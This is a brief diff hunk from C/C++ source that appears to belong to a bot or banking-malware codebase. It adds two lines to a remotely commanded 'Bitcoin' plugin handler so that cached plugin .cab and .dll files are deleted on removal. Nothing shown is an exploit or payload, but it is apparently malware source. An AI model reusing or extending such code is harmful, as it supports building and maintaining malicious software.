@@ -116,7 +116,8 @@ bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args)
 		m_memset( folderBitcoin, 0, sizeof(folderBitcoin) );
 		GetBitcoinFolder(folderBitcoin);
 		DeleteFolders(folderBitcoin);
-
+		Plugin::DeleteFromCache((char*)nameBtcmCab);
+		Plugin::DeleteFromCache((char*)nameBtcDll);
 		ret = true;
 	}
 	else if( m_lstrcmp( Args, "stop" ) == 0 ) //остановка плагина
